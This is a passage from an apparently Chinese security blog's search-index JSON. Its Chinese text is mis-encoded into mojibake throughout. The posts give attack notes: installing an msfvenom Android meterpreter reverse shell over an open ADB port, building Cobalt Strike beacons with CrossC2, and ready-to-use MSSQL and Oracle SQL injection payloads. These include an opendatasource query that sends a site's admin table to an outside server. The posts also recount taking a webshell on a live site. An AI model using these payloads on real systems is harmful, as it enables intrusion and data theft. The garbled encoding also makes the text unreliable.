{"meta":{"title":"Hu5k7's Blog","subtitle":null,"description":null,"author":"Hu5k7","url":"https://hu5k7.github.io","root":"/"},"pages":[{"title":"archives","date":"2020-07-10T10:40:59.000Z","updated":"2020-07-10T02:40:59.410Z","comments":true,"path":"archives/index.html","permalink":"https://hu5k7.github.io/archives/index.html","excerpt":"","text":""},{"title":"category","date":"2020-07-10T11:30:46.000Z","updated":"2020-07-10T03:30:46.090Z","comments":true,"path":"category/index.html","permalink":"https://hu5k7.github.io/category/index.html","excerpt":"","text":""},{"title":"friends","date":"2020-07-10T11:32:01.000Z","updated":"2020-07-10T04:17:50.961Z","comments":true,"path":"friends/index.html","permalink":"https://hu5k7.github.io/friends/index.html","excerpt":"","text":"å‹é“¾"}],"posts":[{"title":"Mark_Android_GetShell","slug":"takeshell-02","date":"2020-08-30T21:47:58.000Z","updated":"2020-08-30T14:43:14.010Z","comments":true,"path":"2020/08/31/takeshell-02/","link":"","permalink":"https://hu5k7.github.io/2020/08/31/takeshell-02/","excerpt":"0x00 å‰è¨€ hvvåœæ­¢ï¼Œå‘†é…’åº—ï¼Œæ— èŠæ‰«å†…ç½‘ï¼Œæ‰¾åˆ°ä¸€å°å¼€ç€5555ç«¯å£çš„ADBè°ƒè¯•å£ï¼Œè¯•ç€getshell","text":"0x00 å‰è¨€ hvvåœæ­¢ï¼Œå‘†é…’åº—ï¼Œæ— èŠæ‰«å†…ç½‘ï¼Œæ‰¾åˆ°ä¸€å°å¼€ç€5555ç«¯å£çš„ADBè°ƒè¯•å£ï¼Œè¯•ç€getshell ä½¿ç”¨åˆ°çš„å·¥å…·: msfvenom adb (Androidè°ƒè¯•å·¥å…·) 0x01 å‡†å¤‡å·¥ä½œ è¿æ¥å®‰å“adbè°ƒè¯•å£ adb connect æŸ¥çœ‹æ˜¯å¦è®¾å¤‡åˆ—è¡¨ adb devices è¿”å›kaliç”Ÿæˆé©¬ msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.49.161 LPORT=10001 R &gt; apk.apk adb install å®‰è£…ä¸Šå»ã€‚ æŸ¥æ‰¾ å®‰è£…çš„APKåŒ… adb shell pm list packages å› ä¸º å•å•å¯¹ç€åŒ…åappPackage è¿è¡Œæ˜¯è¿è¡Œä¸èµ·æ¥çš„ã€‚éœ€è¦å†æŸ¥è¯¢appActivity adb shell dumpsys package XXXX è¿”å›KALI å¼€å¯ MSF å¼€å§‹è®¾ç½®payload å¹¶ç›‘å¬ use exploit/multi/handler set payload android/meterpreter/reverse_tcp adb shell am start -W -N com.metasploit.stage/.MainActivity","categories":[],"tags":[{"name":"Getshell_Note","slug":"Getshell-Note","permalink":"https://hu5k7.github.io/tags/Getshell-Note/"}]},{"title":"Mark_OnceBuild_CrossC2Object","slug":"Mark-OnceBuild-CrossC2Object","date":"2020-07-10T12:34:09.000Z","updated":"2020-07-13T06:14:51.531Z","comments":true,"path":"2020/07/10/Mark-OnceBuild-CrossC2Object/","link":"","permalink":"https://hu5k7.github.io/2020/07/10/Mark-OnceBuild-CrossC2Object/","excerpt":"0x00 å‰è¨€ åœ¨å…¬å¸é¡¹ç›®ä¸Šï¼Œå¸®å®¢æˆ·æµ‹è¯•å†…ç½‘å®‰å…¨ï¼Œæœ‰ä¸€ä¸ªlinuxç³»ç»Ÿï¼Œç„¶åcsç”Ÿæˆä¸äº†LinuxğŸï¼Œäºæ˜¯æˆ‘å°±æ‰¾åˆ°äº†CrossC2æ’ä»¶ï¼Œä½†æ˜¯å‘¢ï¼ŒCrossC2æœ‰ä¸€äº›æœ‰ç‚¹é—®é¢˜ï¼Œè¿™é‡Œè®°ä¸€æ¬¡ä½¿ç”¨CrossC2çš„è¸©å‘è®°","text":"0x00 å‰è¨€ åœ¨å…¬å¸é¡¹ç›®ä¸Šï¼Œå¸®å®¢æˆ·æµ‹è¯•å†…ç½‘å®‰å…¨ï¼Œæœ‰ä¸€ä¸ªlinuxç³»ç»Ÿï¼Œç„¶åcsç”Ÿæˆä¸äº†LinuxğŸï¼Œäºæ˜¯æˆ‘å°±æ‰¾åˆ°äº†CrossC2æ’ä»¶ï¼Œä½†æ˜¯å‘¢ï¼ŒCrossC2æœ‰ä¸€äº›æœ‰ç‚¹é—®é¢˜ï¼Œè¿™é‡Œè®°ä¸€æ¬¡ä½¿ç”¨CrossC2çš„è¸©å‘è®° 0x01 CrossC2 ä»‹ç» CrossC2 æ˜¯ä¸€æ¬¾ï¼Œå¯ä»¥ç”Ÿæˆ Linux / MacOS çš„ğŸï¼Œè›®å¼ºçš„ 0x02 CrossC2 ä½¿ç”¨ ä»Githubä¸Šé¢git clone ä¸‹æ¥æœ‰ä¸‰ä¸ªæ–‡ä»¶ï¼ŒLinuxåç¼€æ˜¯ç”ŸæˆLinuxğŸ åˆ™ MacOSå°±æ˜¯è‹¹æœç³»ç»Ÿçš„ğŸ CrossC2.cna æ˜¯Cobalt Strike çš„æ’ä»¶ã€‚æœ€ä¸»è¦è¦æ”¹åŠ¨çš„åœ°æ–¹æ˜¯ 77è¡Œã€‚ä¹‹ååœ¨CSä¸ŠåŠ ä¸Šæ’ä»¶å°±èƒ½çœ‹åˆ°äº†ã€‚ æˆ‘æ˜¯ä¸æ¨èä»æ’ä»¶é‡Œç”Ÿæˆæ‹‰ï¼Œé‚£æ ·ç”Ÿæˆçš„ä¸æ˜¯å¾ˆæœ‰æ•ˆæœã€‚ å¤§éƒ¨åˆ†æˆ‘éƒ½æ˜¯ç›´æ¥ä½¿ç”¨ä¸»ç¨‹åºç”ŸæˆğŸã€‚CrossC2éƒ½ä¼šç»™ä½ é»˜è®¤å‚æ•°ï¼Œç¬¬ä¸€ä¸ªé»˜è®¤çš„å°±å·²ç»å¾ˆå¸¸ç”¨äº† æ³¨æ„:è¿™é‡Œæ˜¯è¦æ”¾è¿› cs ç›®å½•ä¸‹çš„ï¼Œä¸ºäº†æ–¹ä¾¿æˆªå›¾å°±ç§»å‡ºæ¥äº† æ³¨æ„:è¿™é‡Œæ˜¯è¦æ”¾è¿› cs ç›®å½•ä¸‹çš„ï¼Œä¸ºäº†æ–¹ä¾¿æˆªå›¾å°±ç§»å‡ºæ¥äº† æ³¨æ„:è¿™é‡Œæ˜¯è¦æ”¾è¿› cs ç›®å½•ä¸‹çš„ï¼Œä¸ºäº†æ–¹ä¾¿æˆªå›¾å°±ç§»å‡ºæ¥äº† é‡è¦çš„äº‹æƒ…è¯´ä¸‰é 0x03 CrossC2çš„å‘ å¼€å¯csï¼Œç›‘å¬httpsï¼Œå‘å°±åœ¨è¿™é‡Œ CrossC2 èµ°çš„å¿…é¡»æ˜¯https æ‰èƒ½å›æ˜¾","categories":[],"tags":[{"name":"note","slug":"note","permalink":"https://hu5k7.github.io/tags/note/"}]},{"title":"iseacmsä»£ç å®¡è®¡å…¥é—¨çº§","slug":"iseacmsä»£ç å®¡è®¡å…¥é—¨çº§","date":"2020-05-13T17:38:00.000Z","updated":"2020-07-10T06:33:48.310Z","comments":true,"path":"2020/05/14/iseacmsä»£ç å®¡è®¡å…¥é—¨çº§/","link":"","permalink":"https://hu5k7.github.io/2020/05/14/iseacmsä»£ç å®¡è®¡å…¥é—¨çº§/","excerpt":"0x01 iseacms ç†Šæµ·CMS ä»‹ç»ğŸ…°ï¸ ç†Šæµ·CMSæ˜¯ç”±ç†Šæµ·å¼€å‘çš„ä¸€æ¬¾å¯å¹¿æ³›åº”ç”¨äºä¸ªäººåšå®¢ï¼Œä¸ªäººç½‘ç«™ï¼Œä¼ä¸šç½‘ç«™çš„ä¸€å¥—ç½‘ç«™ç»¼åˆç®¡ç†ç³»ç»Ÿã€‚ ç®€çš„æ¥è¯´ï¼Œå°±éå¸¸åˆé€‚åˆšåˆšå…¥é—¨çš„ ä»£ç å®¡è®¡æ¡ˆä¾‹ï¼ˆç®€å•åˆ°ä¼šçœ‹ä¸€ç‚¹ç‚¹phpä»£ç çš„äººéƒ½ä¼šçš„å®¡è®¡ï¼‰ï¼Œä»Šå¤©æ¥å¤ç›˜ä¸€ä¸‹","text":"0x01 iseacms ç†Šæµ·CMS ä»‹ç»ğŸ…°ï¸ ç†Šæµ·CMSæ˜¯ç”±ç†Šæµ·å¼€å‘çš„ä¸€æ¬¾å¯å¹¿æ³›åº”ç”¨äºä¸ªäººåšå®¢ï¼Œä¸ªäººç½‘ç«™ï¼Œä¼ä¸šç½‘ç«™çš„ä¸€å¥—ç½‘ç«™ç»¼åˆç®¡ç†ç³»ç»Ÿã€‚ ç®€çš„æ¥è¯´ï¼Œå°±éå¸¸åˆé€‚åˆšåˆšå…¥é—¨çš„ ä»£ç å®¡è®¡æ¡ˆä¾‹ï¼ˆç®€å•åˆ°ä¼šçœ‹ä¸€ç‚¹ç‚¹phpä»£ç çš„äººéƒ½ä¼šçš„å®¡è®¡ï¼‰ï¼Œä»Šå¤©æ¥å¤ç›˜ä¸€ä¸‹ ï¼ˆå…¶å®å·²ç»å¤ç›˜è¿‡äº†ï¼Œåªæ˜¯å†å¤ç›˜ä¸€éæ¥å……å®blogï¼Œå˜»å˜»ğŸ˜„ï¼‰ 0x02 å®æˆ˜ éœ€è¦ç”¨åˆ° seayæºä»£ç å®¡è®¡ç³»ç»Ÿ ä¸ªäººå–œæ¬¢ç›´æ¥ä¸Š è‡ªåŠ¨å®¡è®¡æ‰€ä»¥ï¼Œèµ°ä¸€æ³¢ seayè‡ªåŠ¨å®¡è®¡å‡ºæ¥çš„ï¼Œä¸€èˆ¬ä¸ä¸€å®š100%å­˜åœ¨æ¼æ´ï¼Œå®ƒåŸç†æ˜¯æ­£åˆ™å»åŒ¹é…é‚£äº›å‡½æ•°ï¼Œæ¯”å¦‚ eval() å¯èƒ½å°± ä¼šå†™ä¸Šå…³äºeval() å‡½æ•°çš„æ­£åˆ™åŒ¹é…ã€‚å˜›ã€‚ä¸è¿‡æ¯”èµ·æ‰‹åŠ¨æ…¢æ…¢çš„çœ‹ï¼Œèƒ½çœå»å¾ˆå¤šéº»çƒ¦ã€‚æœ‰èƒ½åŠ›çš„ä¹Ÿå¯ä»¥å…ˆä»£ç é€šè¯» å†è‡ªåŠ¨åŒ–å®¡è®¡ï¼Œæ¯ä¸ªäººæ–¹æ³•ä¸ä¸€ï¼Œæˆ‘å°± ç”¨æˆ‘çš„æ–¹æ³•ã€‚ ç‚¹è¿‡å»çœ‹åˆ°ï¼Œå¸¦æœ‰æ­£åˆ™åŒ¹é…å’Œè½¬ä¹‰çš„å‡½æ•°ã€‚ æ­£åˆ™åŒ¹é…**\\W** å†™æ­»äº†ã€‚ æ¥ç€å¾€ä¸Šçœ‹ /seacmseditor/php/controller.phpï¼š11è¡Œ è¿™ä¸‰ä¸ªå­˜åœ¨æ¼æ´ä¸”èƒ½åˆ©ç”¨ã€‚ éœ€è¦GETä¼ å‚ action, switch å¤šé€‰å‡½æ•°. å…ˆç¬¬ä¸€ä¸ªuploadfile ä¸Šä¼ æ‰“å¼€æŠ“åŒ…ä¸Šä¼ è¯•ä¸€ä¸‹ã€‚ unicode è§£ç çœ‹ä¸€ä¸‹\\u672a\\u77e5\\u9519\\u8bef =&gt; æœªçŸ¥é”™è¯¯ ğŸ™… å®Œç¾ï¼ŒæœªçŸ¥é”™è¯¯ ä¸‹ä¸€ä¸ªï¼ŒSQLæ³¨å…¥ 0x03 å¤šå¤„SQLæ³¨å…¥ /files/content.phpï¼š19è¡Œ åŠ äº† è½¬ä¹‰å‡½æ•° å¯ä»¥ä½¿ç”¨ å®½å­—èŠ‚æ³¨å…¥(æœ‰æ¡ä»¶) æŠ¥é”™æ³¨å…¥ è¿™é‡Œå°±ä½¿ç”¨ æŠ¥é”™æ³¨å…¥ æŠŠ å®½å­—èŠ‚æ³¨å…¥éœ€è¦ GBKç¼–ç  ç™½ç›’å®¡è®¡ æºä»£ç  é‡Œæ˜æ˜¾æ²¡æœ‰å•ç‹¬è®¾ç½® ç¼–ç æ‰€ä»¥æ˜¯ä¸è¡Œçš„ã€‚ æˆåŠŸæŠ¥å‡ºæ•°æ®åº“ åŒæ ·å­˜åœ¨SQLæ³¨å…¥çš„æ–‡ä»¶: /files/software.php /admin/files/reply.php /admin/files/newlink.php","categories":[],"tags":[{"name":"code","slug":"code","permalink":"https://hu5k7.github.io/tags/code/"}]},{"title":"Mark-once-WebShell_01","slug":"takeshell-01","date":"2020-04-09T20:51:27.000Z","updated":"2020-07-10T06:34:28.766Z","comments":true,"path":"2020/04/10/takeshell-01/","link":"","permalink":"https://hu5k7.github.io/2020/04/10/takeshell-01/","excerpt":"0x01 èµ·å› ğŸ´ åœ¨åšSRCæ´»åŠ¨çš„æ—¶å€™ã€‚æ‰«æåˆ°ä¸€ä¸ª ç½‘ç«™æºç å¤‡ä»½çš„ç½‘ç«™ï¼Œäºæ˜¯å°±æ‰“ç®—è¿›ä¸€æ­¥æ¸—é€ã€‚çœ‹çœ‹èƒ½ä¸èƒ½æ‹¿SHELL","text":"0x01 èµ·å› ğŸ´ åœ¨åšSRCæ´»åŠ¨çš„æ—¶å€™ã€‚æ‰«æåˆ°ä¸€ä¸ª ç½‘ç«™æºç å¤‡ä»½çš„ç½‘ç«™ï¼Œäºæ˜¯å°±æ‰“ç®—è¿›ä¸€æ­¥æ¸—é€ã€‚çœ‹çœ‹èƒ½ä¸èƒ½æ‹¿SHELL 0x02 ç½‘ç«™SQLæ³¨å…¥ ä»£ç å®¡è®¡åŠŸåº•ä¸å¤ªç†Ÿï¼Œå°±ç®€å•åˆ†æäº†ä¸€ä¸‹æ–‡ä»¶å†…å®¹ã€‚ çŸ¥é“äº†åå°ç®¡ç†æ˜¯/**system/ä¸‹ã€‚ç„¶åå°±å»ç½‘ç«™çœ‹çœ‹èƒ½ä¸èƒ½å‘ç°å…¶ä»–çš„æ¼æ´ å…ˆèµ°ä¸ªæµç¨‹ä¿¡æ¯æ”¶é›†ä¸‹ã€‚ æƒŠäº†ã€‚Iis8.5 æƒ¹ä¸èµ·æƒ¹ä¸èµ·ã€‚ åœ¨ä¸€ä¸ªåœ°æ–¹æ‰¾åˆ°äº†ä¸€ä¸ªSQLæ³¨å…¥ å¾—åŠ²ğŸ”¥ å‘ç°sqlmapè·‘ä¸å‡º å¯†ç â”äºæ˜¯ æˆ‘ä¸Šæ‰‹å·¥äº† ğŸ–¤å¾—å˜ã€‚ã€‚ç›´æ¥æ‰”è¿›SOMD5é‡Œè§£å¯†ã€‚ ç™»å½•åå°çœ‹çœ‹ ã€‚ã€‚ã€‚ ã€‚ã€‚ã€‚ ã€‚ã€‚ã€‚ æ‰¾äº†ä¸€äº›ã€‚èƒ½ä¸Šä¼ çš„åœ°æ–¹ï¼Œä½†æ˜¯éƒ½å¤±è´¥äº†ã€‚ç»éªŒä¸è¶³ä¸å¤ªä¼šã€‚ğŸ˜© æ­£æ€è€ƒå’‹åŠçš„æ—¶å€™ã€‚çªç„¶çµå…‰ä¸€é—ªğŸŒ,å’±ä»¬ä¸æ˜¯è¿˜æœ‰SQLæ³¨å…¥å˜›ã€‚è¿˜æ˜¯MSSQLçš„æ•°æ®åº“ ç›´æ¥ä¸ŠOS-SHELL 0x03 WEBSHELL ğŸŒ„ æƒé™æœ‰ç‚¹ä½å—·ã€‚ğŸ‰‘ ä¸Šä¼ ä¸€å¥è¯aspxå°é©¬ ç™¾åº¦äº‘çš„ä¸»æœºï¼Œæƒ¹ä¸èµ· ã€‚ã€‚ ã€‚ã€‚ ã€‚ã€‚ åˆ°è¿™é‡Œæˆ‘ä¹Ÿå°±ä¸ç»§ç»­æ·±ç©¶äº†ã€‚è¯¥åˆ æœ¨é©¬çš„éƒ½åˆ äº† æœ¬äººèœé¸Ÿç»éªŒä¸è¶³ã€‚ææƒé‚£äº›ã€‚240ä¸ªè¡¥ä¸ï¼Œæä¸ä¸Šã€‚ä¹Ÿæ²¡pythonç¯å¢ƒï¼Œ","categories":[],"tags":[{"name":"Getshell_Note","slug":"Getshell-Note","permalink":"https://hu5k7.github.io/tags/Getshell-Note/"}]},{"title":"MSSQL_Blind_Injection","slug":"MSSQLç›²æ³¨","date":"2020-02-24T01:57:29.000Z","updated":"2020-07-10T06:34:57.185Z","comments":true,"path":"2020/02/24/MSSQLç›²æ³¨/","link":"","permalink":"https://hu5k7.github.io/2020/02/24/MSSQLç›²æ³¨/","excerpt":"0x00 å‰è¨€ ä¸è¦é—®æˆ‘ä¸ºä»€ä¹ˆä¸é…å›¾ã€‚å› ä¸ºè¿™ä¸ªhexoè€æ˜¯æ¸²æŸ“å¤±è´¥ã€‚æçš„æˆ‘ç›´æ¥è£‚å¼€äº†ã€‚","text":"0x00 å‰è¨€ ä¸è¦é—®æˆ‘ä¸ºä»€ä¹ˆä¸é…å›¾ã€‚å› ä¸ºè¿™ä¸ªhexoè€æ˜¯æ¸²æŸ“å¤±è´¥ã€‚æçš„æˆ‘ç›´æ¥è£‚å¼€äº†ã€‚ 0x01 MSSQLç›²æ³¨_å‰æœŸçŸ¥è¯† äº†è§£å‰ã€‚å…ˆæœ‰ä¸¤ä¸ªå‡½æ•°è¦å…ˆäº†è§£ä¸€ä¸‹count(),object_id() 1.union all select count(*) from dbo.sysobjects union all select count(*) from dbo.sysobjects countæŒ‡æ˜¯æŸ¥è¯¢è¡¨çš„æ‰€æœ‰è®°å½•æ•°ï¼Œä¹Ÿå°±æ˜¯æ— éœ€å»order byæŸ¥è¯¢å­—æ®µæ•°ã€‚å°±èƒ½è¾¾æˆå›æ˜¾(åªé™äºç›²æ³¨8?) ========================================= ?id=1 union all select null,db_name(),null //æŸ¥è¯¢å½“å‰åº“å ?id=1 union all select dbid,name,null from master.dbo.sysdatabases //æŸ¥è¯¢å½“å‰æ‰€æœ‰åº“ dbid æ˜¯æŒ‡æ•°æ®åº“çš„id, master.dbo.sysdatabases åˆ™æ˜¯æ¥æŸ¥è¯¢åº“ ========================================== object_id() ç®€å•çš„ä¸€å¥è¯æ€»ç»“å°±æ˜¯ å…å»äº† æŸ¥è¯¢id unino all select null,name,null from dbo.syscolumns where id=object_id('dbo.admin') //è¦æ³¨æ„è¿™é‡Œè¦åŠ å•å¼•å·æ‹¬èµ·æ¥ 0x02 MSSQLç›²æ³¨ #æŸ¥è¯¢åº“åé•¿åº¦ ?id=1 and (select count(*)from master.dbo.databases where dbid=1 and len(name)=4)=1 ==================================================== #æŸ¥è¯¢åº“å ?id=1 and (select count(*) from master.dbo.databases where dbid=1 and ascii(substring(name,1,1))=100)=1 =================================================== #æŸ¥è¯¢è¡¨å ?id=1 and (select count(*) from dbo.sysobjects where name in(select top 1 name from dbo.sysobjects where xtype='U')and ascii(substring(name,1,1))=100)=1 ?id=1 and (select count(*) from dbo.sysobjects where name in(select top 1 name from dbo.sysobjects where xtype='U' and name not in('zkaq'))and ascii(substring(name,1,1))=100)=1 tips: (top 1) æ˜¯æŒ‡æŸ¥è¯¢æœ€å¤§å€¼çš„é‚£ä¸€ä¸ª ================================================== #æŸ¥è¯¢å­—æ®µå (å‡è®¾å·²çŒœå‡ºè¡¨å(zkaq666)) ?id=1 and (select count(*)from dbo.sysobjects where name in(select top 1 name from dbo.sysobjects where id=object_id('dbo.zkaq666'))and ascii(substring(name,1,1))=100)=1 ==================================================== #æŸ¥è¯¢å­—æ®µå†…å®¹ (å‡è®¾å·²çŒœå‡ºå­—æ®µå(username)) ?id=1 and (select count(*) from dbo.zkaq666 where username in(select top 1 username from dbo.zkaq666)and ascii(substring(username,1,1))=100)=1 0x03 æ€»ç»“ å¾ˆä»–å¦ˆç®€å•ã€‚çœ‹ä¸æ‡‚çš„è‡ªå·±å»è¯•ä¸€è¯•ï¼ å‚è€ƒè¿æ¥link: https://blog.csdn.net/v_gbird/article/details/93981684 https://blog.csdn.net/kuxing100/article/details/9670533","categories":[],"tags":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/tags/Note/"}]},{"title":"Oracle Injection","slug":"Oracleæ³¨å…¥","date":"2020-02-19T19:57:37.000Z","updated":"2020-07-10T06:35:05.559Z","comments":true,"path":"2020/02/20/Oracleæ³¨å…¥/","link":"","permalink":"https://hu5k7.github.io/2020/02/20/Oracleæ³¨å…¥/","excerpt":"0x01 æ˜¾é”™æ³¨å…¥ğŸ”¥","text":"0x01 æ˜¾é”™æ³¨å…¥ğŸ”¥ æ‰€ç”¨åˆ°çš„è¯­å¥ and 1=ctxsys.drithsx.sn(1,(payload)) table_name&lt;&gt;â€˜ADMINâ€™ //&lt;&gt;æ„æ€æ˜¯ ä¸ç­‰äºã€‚ä¹Ÿå°±æ˜¯æ’é™¤ and 1=ctxsys.drithsx.sn(1,(select table_name from user_tables from rownum=1)) â«rownumæŒ‡ï¼Œé™åˆ¶è¾“å‡ºåªè¾“å‡ºä¸€ä¸ªã€‚æŸ¥è¯¢è¡¨ and 1=ctxsys.drithsx.sn(1,(select column_name from user_tab_columns where table_name=â€˜ADMINâ€™ and rownum=1))","categories":[],"tags":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/tags/Note/"}]},{"title":"MSSQL Injection","slug":"MSSQLæ³¨å…¥","date":"2020-02-19T19:57:29.000Z","updated":"2020-07-10T06:34:44.344Z","comments":true,"path":"2020/02/20/MSSQLæ³¨å…¥/","link":"","permalink":"https://hu5k7.github.io/2020/02/20/MSSQLæ³¨å…¥/","excerpt":"0x01 æ˜¾é”™æ³¨å…¥ğŸ”¥","text":"0x01 æ˜¾é”™æ³¨å…¥ğŸ”¥ union all select db_name() //æŸ¥è¯¢å½“å‰åº“å union all select null,name,null from master.dbo.sysdatabases //æŸ¥è¯¢æ•°æ®åº“ union all select null,null,null from dbo.sysobjects //æŸ¥è¯¢è¡¨ union all select null,null,null from dbo.syscolumns //æŸ¥è¯¢å­—æ®µ æŸ¥è¯¢æ•°æ®åº“ğŸ’» ?id=1 union all select null,name,null from master.dbo.stsdatabases æŸ¥è¯¢è¡¨åğŸ“‘ ?id=1 union all select id,name,null from dbo.sysobjects where xtype=â€˜Uâ€™ â«id å’Œ name æ˜¯ç³»ç»Ÿè‡ªå¸¦çš„å­—æ®µåã€‚æŸ¥è¯¢å®Œéœ€è¦è®°ä½ï¼Œä½ è¦æŸ¥è¯¢çš„è¡¨IDã€‚xtype='Uâ€™æ˜¯æŒ‡ç”¨æˆ·åˆ›å»ºçš„è¡¨ æŸ¥è¯¢å­—æ®µå ?id=1 union all select null,name,null from dbo.syscolumns where id=xxxxxx â« nullæ˜¯æŒ‡3ä¸ªå­—æ®µã€‚mssqlé‡Œçš„å­—ç¬¦ä¸²ç±»å‹ç®¡ç†ä¸¥æ ¼ï¼Œæœ‰å¯èƒ½ä¸€ä¸ªæ˜¯intç±»å‹ã€‚æˆ–è€…strç±»å‹ç­‰ã€‚ æŸ¥è¯¢å­—æ®µå†…å®¹ ?id=1 union all select null,password,null from admin 0x02 MSSQL åå¼¹æ³¨å…¥ğŸˆ å‰è¨€: è¿™ä¸ªæ˜¯ä¸€ä¸ªæ¯”è¾ƒéªšçš„æ“ä½œã€‚é’ˆå¯¹æ— å›æ˜¾æ³¨å…¥ç‚¹çš„æ—¶å€™ã€‚ 0x02.1 åå¼¹æ³¨å…¥åŸç† â˜‚ï¸MSSQLæ³¨å°„æ”»å‡»æ˜¯æœ€ä¸ºå¤æ‚çš„æ•°æ®åº“æ”»å‡»æŠ€æœ¯ï¼Œç”±äºè¯¥æ•°æ®åº“åŠŸèƒ½ååˆ†å¼ºå¤§ï¼Œå­˜å‚¨è¿‡ç¨‹ä»¥åŠå‡½æ•°è¯­å¥ååˆ†ä¸°å¯Œï¼Œè¿™äº›çµæ´»çš„è¯­å¥é€ å°±äº†æ–°é¢–çš„æ”»å‡»æ€è·¯ï¼Œè€Œåå¼¹æ³¨å…¥æŠ€æœ¯éœ€è¦ä¾é opendatasourceå‡½æ•°æ”¯æŒ 0x02.2 åå¼¹æ³¨å…¥æ¡ä»¶ ğŸŒéœ€è¦ä¸€å°å¤–ç½‘ä¸»æœºï¼Œå­—æ®µè¦ç›¸åŒ å¤ç° PayloadğŸ”« insert into opendatasource(â€˜sqloledbâ€™,â€˜server=IP,1433;uid=USERNAME;pwd=PASSWORD;database=DATABASEâ€™).DATABASE.dbo.TABLES select *from admin å¥å­ç†è§£ opendatasource(â€˜sqloledbâ€™,â€˜server=IP,1433;uid=USERNAME;pwd=PASSWORD;database=DATABASEâ€™).DATABASE.dbo.TABLES select *from admin å»ºç«‹tempè¡¨4ä¸ªå­—æ®µ create table temp(a varchar(255), b varchar(255),c varchar(255),d varchar(255)) æ’å…¥è¯­å¥åæŸ¥è¯¢","categories":[],"tags":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/tags/Note/"}]},{"title":"vim-vundle install and configuration","slug":"vim-vundleå®‰è£…å’Œé…ç½®","date":"2019-12-15T15:53:01.000Z","updated":"2020-07-10T05:32:39.186Z","comments":true,"path":"2019/12/15/vim-vundleå®‰è£…å’Œé…ç½®/","link":"","permalink":"https://hu5k7.github.io/2019/12/15/vim-vundleå®‰è£…å’Œé…ç½®/","excerpt":"0x00 å‰è¨€ æƒ³åœ¨pycharmä½¿ç”¨ pwntools ä½†æ˜¯ pwntoolsä¸æ”¯æŒwindowsã€‚åªèƒ½è·‘åˆ°Linuxæï¼Œä½†æ˜¯Vimæ²¡æœ‰è¡¥å…¨äºæ˜¯æ‰“ç®—è£…ä¸ª è¡¥å…¨æ’ä»¶ã€‚é¡ºä¾¿å†™ä¸ªç¬”è®°","text":"0x00 å‰è¨€ æƒ³åœ¨pycharmä½¿ç”¨ pwntools ä½†æ˜¯ pwntoolsä¸æ”¯æŒwindowsã€‚åªèƒ½è·‘åˆ°Linuxæï¼Œä½†æ˜¯Vimæ²¡æœ‰è¡¥å…¨äºæ˜¯æ‰“ç®—è£…ä¸ª è¡¥å…¨æ’ä»¶ã€‚é¡ºä¾¿å†™ä¸ªç¬”è®° ç¯å¢ƒï¼šKali 0x01 Vundleæ’ä»¶ç®¡ç†å®‰è£… æˆ‘ç”¨çš„æ˜¯kaliå’Œæ™®é€šå®‰è£…æœ‰äº›ä¸åŒã€‚ ç¬¬ä¸€æ­¥ gitï¼š git clone https://github.com/VundleVim/Vundle.vim.git ~/.vim/bundle/Vundle.vim åœ¨ ç”¨æˆ· ä¸‹å»ºç«‹.vimrcæ–‡ä»¶ ä¾‹å­ï¼š user: /user/.vimrc root: /root/.vimrc å†™ä¸Šä»¥ä¸‹çš„å¥å­ set nocompatible &quot; be iMproved, required filetype off &quot; required &quot; set the runtime path to include Vundle and initialize set rtp+=~/.vim/bundle/Vundle.vim call vundle#begin() Plugin 'VundleVim/Vundle.vim' Plugin 'tpope/vim-fugitive' Plugin 'L9' call vundle#end() &quot; required filetype plugin indent on &quot; required æ‰“å¼€VIM ç›´æ¥æ‰“å¼€ä¸ç”¨é…åˆå…¶ä»–æ–‡ä»¶ä»€ä¹ˆçš„ã€‚ è¾“å…¥ :PluginInstallã€‚å®‰è£…å®Œåæ›´æ–°ä¸€ä¸‹ :PluginUpdate ç­‰æ˜¾ç¤ºDoneï¼çš„å­—çš„æ—¶å€™å°±ä»£è¡¨çš„ å®‰è£…/æ›´æ–° æˆåŠŸ call vundle#begin() ''' #æ’ä»¶åç§°ä½ç½® call vundle#end() å¦‚æœæˆ‘è¿™é‡Œä¸è¯¦ç»†ï¼Œå¯ä»¥å»githubçœ‹åŸç‰ˆçš„æ¡£æ¡ˆ åœ°å€ï¼šhttps://github.com/VundleVim/ 0x02 vimå®‰è£…molokaié…è‰²æ–¹æ¡ˆ æˆ‘å®‰è£…å®Œæ’ä»¶åï¼Œå­—ä½“æ²¡äº†é¢œè‰²ã€‚æˆ‘ä¹Ÿæ²¡çœ‹å‡ºé—®é¢˜æ‰€åœ¨ã€‚å­—ä½“é¢œè‰²è„šæœ¬éƒ½æ²¡æœ‰åŠ è½½ã€‚æ‰€ä»¥æˆ‘æ‰“ç®—ç›´æ¥ä½¿ç”¨vimçš„æ’ä»¶ã€‚ä¸ä½¿ç”¨è‡ªå¸¦çš„é¢œè‰²è„šæœ¬ ç›´æ¥git ä¸‹æ¥ git clone https://github.com/tomasr/molokai.git ç„¶å mv molokai/ /usr/share/(ä½ çš„vimç‰ˆæœ¬)/colors/ ä¸‹ã€‚ å¹¶åœ¨.vimrcæ–‡ä»¶ åé¢åŠ ä¸Š colorsheme molokai let g:molokai_original=1 set t_Co=256 set background=drak syntax on set nu! ä¿å­˜å¹¶é€€å‡ºã€‚è¿‡ä¼šå°±ä¼šç”Ÿæ•ˆäº†ã€‚","categories":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/categories/Note/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/tags/Note/"}]},{"title":"vulnhub_sunrise","slug":"vulnhubé¶æœº-sunrise","date":"2019-12-14T18:55:03.000Z","updated":"2020-07-10T05:32:41.764Z","comments":true,"path":"2019/12/15/vulnhubé¶æœº-sunrise/","link":"","permalink":"https://hu5k7.github.io/2019/12/15/vulnhubé¶æœº-sunrise/","excerpt":"0x00 å‰è¨€ å‰å‡ å¤©é€›äº†ä¸€ä¸‹vulnhub,çœ‹åˆ°æ¯”è¾ƒé€‚åˆæ–°æ‰‹çš„é¶æœºã€‚å°±ä¸‹è½½ä¸‹æ¥ç©ç©ã€‚ å¯æ²¡æƒ³åˆ°ä¸€ä¸ªå‘ï¼Œå‘äº†æˆ‘ä¸¤å¤©åŠï¼Œå…±ç”¨è®¡ä¸¤å¤©åŠã€‚ æœ‰å¥è¯æˆ‘æƒ³è®²ä¸€ä¸‹ **************************!!!","text":"0x00 å‰è¨€ å‰å‡ 